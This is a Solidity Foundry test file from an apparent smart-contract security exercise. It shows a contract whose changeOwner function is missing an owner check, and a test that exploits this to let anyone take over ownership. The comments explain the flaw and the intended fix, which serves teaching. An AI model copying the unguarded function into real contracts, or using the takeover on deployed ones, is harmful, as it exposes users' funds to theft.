// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

// this excersise is about wrong visibility of function resulting in access control issue
// impact: the owner of the contract can be changed by anyone
import "forge-std/Test.sol";

contract ContractTest is Test {
    ownerGame ownerGameContract;

    function testVisibility() public {
        ownerGameContract = new ownerGame();
        console.log(
            "Before exploiting, owner of ownerGame:",
            ownerGameContract.owner()
        );
        ownerGameContract.changeOwner(msg.sender);
        console.log(
            "After exploiting, owner of ownerGame:",
            ownerGameContract.owner()
        );
        console.log("Exploit completed");
    }

    receive() external payable {}
}

contract ownerGame {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // wrong visibility of changeOwner function should be onlyOwner
    function changeOwner(address _new) public {
        owner = _new;
    }
}
